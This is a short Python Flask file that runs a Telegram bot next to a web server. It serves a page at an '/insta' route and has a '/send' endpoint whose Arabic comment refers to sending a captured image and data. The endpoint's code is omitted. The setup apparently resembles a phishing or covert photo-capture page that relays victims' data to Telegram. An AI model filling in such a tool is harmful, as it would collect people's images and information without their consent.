from flask import Flask, render_template, request
import telebot
import threading

app = Flask(__name__)
bot = telebot.TeleBot('YOUR_TOKEN_HERE')

@app.route('/')
@app.route('/insta')
def index():
    return render_template('index.html')

@app.route('/send', methods=['POST'])
def send_data():
    # هنا كود إرسال الصورة والبيانات الذي كتبناه سابقاً
    return 'Success'

if __name__ == '__main__':
    threading.Thread(target=bot.infinity_polling).start()
    app.run(host='0.0.0.0', port=10000)
